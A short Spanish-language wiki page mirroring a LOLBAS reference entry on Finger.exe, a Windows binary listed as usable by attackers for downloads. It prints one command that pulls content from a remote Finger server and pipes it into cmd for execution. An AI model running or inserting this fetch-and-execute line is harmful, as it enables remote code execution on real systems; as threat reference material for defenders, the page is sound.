# LOLBAS: Finger.exe

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[LOLBAS|Índice LOLBAS]]

> Fuente: [https://lolbas-project.github.io/](https://lolbas-project.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

LOLBAS — binarios legitimos de Windows usables como atacante (living off the land).

**Categorías:** `Download`

Displays information about a user or users on a specified remote computer that is running the Finger service or daemon

## Comandos

### Download malicious payload

Download · priv: User · T1105

```cmd
finger user@example.host.com | more +2 | cmd
```

Downloads payload from remote Finger server. This example connects to "example.host.com" asking for user "user"; the result could contain malicious shellcode which is executed by the cmd process.

